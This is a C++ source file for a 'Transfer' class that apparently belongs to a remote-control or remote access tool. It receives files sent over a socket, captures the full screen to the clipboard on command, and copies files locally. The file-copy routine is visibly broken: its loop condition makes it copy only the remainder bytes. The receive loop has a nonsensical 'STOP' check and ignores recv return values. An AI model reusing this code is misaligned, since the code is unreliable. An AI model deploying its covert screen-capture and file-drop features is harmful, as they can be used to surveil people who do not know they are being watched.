#pragma once
#include "Scripts_c.h"



void Transfer::uploadToClient(Client* client, std::string filename)
{

		std::cout << "Uploading .." << std::endl;
		client->send_b(("upload " + filename).c_str());
		char buffer[BUFFER_LEN] = { 0 };

		recv(*client->getSock(),buffer,BUFFER_LEN,0); // SIZE
		const unsigned int size = atoi(buffer);
		std::cout << "Size : " << size << " bytes" << std::endl;
		std::ofstream file_export(filename, std::ios::binary | std::ios::out | std::ios::trunc);
		int nb = 0;

		if (file_export)
		{
			std::cout << "File created" << std::endl;
			const int len = 1024;
			int current_size = 0;
			char memblock[len] = { 0 };
			const int rest = size % len;	
			Sleep(2000);
			while (current_size != size || std::string(memblock) == "STOP")
			{
				if (current_size + rest == size)
				{
					recv(*client->getSock(), memblock, rest,0);
					file_export.write(memblock, rest);
					break;
				}
				else
				{
					recv(*client->getSock(), memblock, len, 0);
					file_export.write(memblock, len);
					current_size += len;
				}
				nb++;
			}
			file_export.close();
		}
		else
		{
			client->send_b("Can't create the file : ");
			client->send_b(filename.c_str());
		}

		std::cout << "Nb : " << nb << std::endl;
}

void Transfer::screenshot(Client* client)
{
		client->send_b("Taking screenshot ..");
		POINT screen = { GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN) };
		POINT a, b;
		a.x = 0;
		a.y = 0;
		b.x = screen.x;
		b.y = screen.y;

		HDC     hScreen = GetDC(NULL);
		HDC     hDC = CreateCompatibleDC(hScreen);
		HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, abs(b.x - a.x), abs(b.y - a.y));
		HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
		BOOL    bRet = BitBlt(hDC, 0, 0, abs(b.x - a.x), abs(b.y - a.y), hScreen, a.x, a.y, SRCCOPY);

		// save bitmap to clipboard
		OpenClipboard(NULL);
		EmptyClipboard();
		SetClipboardData(CF_BITMAP, hBitmap);
		CloseClipboard();

		// clean up
		SelectObject(hDC, old_obj);
		DeleteDC(hDC);
		ReleaseDC(NULL, hScreen);
		DeleteObject(hBitmap);

		client->send_b("Done");
}


int Transfer::getSize(std::string filename)
{
	std::ifstream file(filename, std::ios::binary);
	if (file)
	{
		std::streampos beg, end;
		beg = file.tellg();
		file.seekg(0, std::ios::end);
		end = file.tellg();
		file.close();
		return (end - beg);
	}
	else
		return 0;

}

void Transfer::Copy(std::string filename_out, std::string filename)
{
	const unsigned int len = 1024;
	std::ofstream file_export(filename_out, std::ios::binary | std::ios::out | std::ios::trunc);
	std::ifstream file(filename, std::ios::binary | std::ios::in);

	std::cout << "Size : " << getSize(filename) << "bytes" << std::endl;
	const int size = getSize(filename);
	int current_size = 0;
	char memblock[len] = { 0 };

	if (file && file_export)
	{
		file.seekg(0, std::ios::beg);
		const int rest = size % len;
		while (size != current_size)
		{
			if (current_size != size)
			{
				file.read(memblock, rest);
				file_export.write(memblock, rest);
				current_size += rest;
				break;
			}
			else
			{
				file.read(memblock, BUFFER_LEN);
				file_export.write(memblock, BUFFER_LEN);
				current_size += BUFFER_LEN;
				file.seekg(current_size, std::ios::beg);
			}
		}
		file.close();
		file_export.close();
		std::cout << "DONE";
	}
}
